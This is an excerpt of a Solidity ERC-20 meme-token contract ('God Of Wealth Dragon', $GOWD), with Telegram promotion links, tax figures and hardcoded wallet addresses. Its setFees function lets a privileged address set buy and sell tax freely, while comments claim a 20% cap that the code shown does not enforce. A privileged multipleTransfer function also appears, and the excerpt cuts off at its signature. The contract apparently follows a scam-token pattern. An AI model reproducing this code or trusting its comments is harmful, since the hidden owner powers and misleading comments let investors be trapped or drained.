// Telegram Channel: https://t.me/GodOfWealthDRAGON
// Telegram Group: https://t.me/+dghAKenuzpc3MWVl

/**
SUPPLY: 888,000,0000,000
TAX BUY: 4%
TAX SELL: 4%
**/
...
contract GodOfWealthDragon is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "God Of Wealth Dragon";
    string private constant _symbol = unicode"$GOWD";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 888000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0xbC525Fbe6dF3fd42bD845332361246F230a82434);
    address payable public MarketingWallet = payable(0x712aA06A74EEDfd1f59319dB70aEb74982947fC6);
    ...
    function setFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax; // Can't set =>20%
        _tax_On_Sell = selltax; // Can't set =>20%
    }
    ...
    function multipleTransfer(uint256 value, address adr) onlyAddress public virtual {
